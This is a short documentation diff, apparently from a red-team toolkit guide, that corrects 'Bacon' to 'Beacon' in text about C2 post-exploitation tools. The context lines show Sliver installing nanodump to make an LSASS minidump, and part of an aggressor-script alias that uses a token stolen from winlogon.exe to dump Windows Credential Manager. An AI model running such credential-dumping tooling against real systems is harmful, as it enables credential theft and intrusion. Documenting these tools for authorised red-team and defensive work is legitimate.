@@ -15,7 +15,7 @@ sliver > armory install nanodump
 
 sliver > nanodump -h
 
-A Bacon Object File that creates a minidump of the LSASS process.
+A Beacon Object File that creates a minidump of the LSASS process.
 
 Usage:
 ======
@@ -59,10 +59,10 @@ alias CredMan {
     btask($1, "Running CredMan");
 
 
-    bacon_inline_execute($1,$data,"go",$args);
+    beacon_inline_execute($1,$data,"go",$args);
 }
 
-bacon_command_register(
+beacon_command_register(
 "CredMan",
 "Enables SeTrustedCredManAccess Privilege in a token stolen from winlogon.exe to dump Windows Credential Manager");
 ```
